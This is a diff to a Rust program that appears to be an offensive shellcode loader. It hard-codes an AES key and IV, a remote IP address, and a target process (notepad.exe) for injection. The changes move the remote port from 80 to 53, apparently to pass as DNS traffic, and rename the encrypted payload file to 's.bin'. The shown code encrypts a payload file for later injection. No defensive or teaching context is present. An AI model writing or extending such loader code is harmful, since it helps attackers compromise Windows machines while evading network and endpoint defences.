@@ -16,9 +16,9 @@ const KEY_HEX: &str = "359d003b202332e5630cdef69702dff35cc946f6cc9efd4cbad7c0b40
 const IV_HEX: &str = "34421aedd8bc5caec8a9075aa67bf9aa";
 
 const REMOTE_IP: &str = "10.10.14.16";
-const REMOTE_PORT: &str = "80";
+const REMOTE_PORT: &str = "53";
 
-const FILE_PATH: &str = "s";
+const FILE_PATH: &str = "s.bin";
 const INJECTION_PROCESS: &str = "C:\\windows\\system32\\notepad.exe";
 
 fn main() {
@@ -31,7 +31,7 @@ fn main() {
             let plaintext = std::fs::read(filepath).expect("Failed to read file");
             let encrypted = encrypt_data(&key, &plaintext);
             let dir = std::path::Path::new(filepath).parent().unwrap_or(std::path::Path::new("."));
-            std::fs::write(dir.join("s"), encrypted).expect("Failed to write encrypted file");
+            std::fs::write(dir.join(FILE_PATH), encrypted).expect("Failed to write encrypted file");
             return;
         }
     }
